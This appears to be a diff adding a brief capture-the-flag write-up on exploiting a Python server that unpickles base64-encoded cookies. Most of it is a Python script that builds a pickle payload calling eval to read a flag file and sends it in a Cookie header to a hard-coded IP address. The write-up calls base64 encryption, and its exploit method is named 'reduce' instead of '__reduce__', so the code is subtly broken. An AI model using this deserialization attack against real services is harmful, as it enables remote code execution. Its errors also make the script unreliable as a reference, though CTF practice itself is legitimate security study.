@@ -1,0 +1,20 @@
+let's check on what server this website runs
+curl -I [url]
+now we know that it runs on python and we got our set-cookie
+let's try to decode this cookie
+echo -n '...' | base64 -d
+now we know that cookies are ecnrypted in base64, we got python server -> pickle server
+let's write a python code to get our CTF
+import pickle 
+import base64
+import requests
+class Exploit (object):
+        def reduce (self):
+                return eval, ("open('flag', 'r').read()", )
+def sendPayload(p):
+        print (base64.urlsafe_b64encode(p))
+        headers ={"Cookie": "data=" + base64.urlsafe_b64encode(p).decode()}
+        t = requests.get("http://34.141.39.165:31924/dashboard", headers=headers) 
+        print(t.text)
+sendPayload(pickle.dumps(Exploit(), protocol=2))
+and here is our CTF
